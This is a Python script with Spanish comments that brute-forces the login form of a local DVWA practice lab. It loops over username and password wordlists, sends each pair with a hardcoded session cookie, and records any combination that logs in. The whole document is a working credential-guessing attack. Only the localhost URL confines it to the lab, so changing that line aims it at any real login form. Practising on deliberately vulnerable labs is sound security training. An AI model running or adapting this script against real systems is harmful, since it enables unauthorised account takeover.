import requests

# URL del formulario de inicio de sesión
url = 'http://localhost:8080/vulnerabilities/brute/'

# Ruta al archivo con las 100 contraseñas más comunes
#https://gist.github.com/giper45/414c7adf883f113142c2dde1106c
password_file = '/home/jb/Downloads/common_usernames'

# Ruta al archivo con los nombres de usuario
# https://github.com/olea/lemarios/blob/master/nombres-propios-es.txt
users_file = '/home/jb/Downloads/nombres-minusculas.txt'

# Cabeceras HTTP que simulan un navegador
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Referer': url,
    'Cookie': 'security=low; PHPSESSID=e51101c1e260e8db289b618efde48b5c'
}

# Lista para almacenar los intentos exitosos
successful_logins = []

# Función para probar cada usuario/contraseña
def attempt_login(username, password):
    params = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    response = requests.get(url, headers=headers, params=params)
    
    if "Welcome to the password protected area" in response.text:
        print(f"Inicio de sesión exitoso con {username}:{password}")
        successful_logins.append((username, password))
        return True
    return False

# Leer el archivo de contraseñas y usuarios, y probar cada combinación usuario/contraseña
with open(password_file, 'r') as pass_file, open(users_file, 'r') as user_file:
    passwords = [line.strip() for line in pass_file]
    users = [line.strip() for line in user_file]

    for password in passwords:
        for user in users:
            print(f"Probando con el usuario: {user} y la contraseña: {password}")
            attempt_login(user, password)

# Mostrar todos los intentos exitosos al final
print("\nHistorial de intentos exitosos:")
if successful_logins:
    for username, password in successful_logins:
        print(f"Usuario: {username}, Contraseña: {password}")
else:
    print("No hubo inicios de sesión exitosos.")
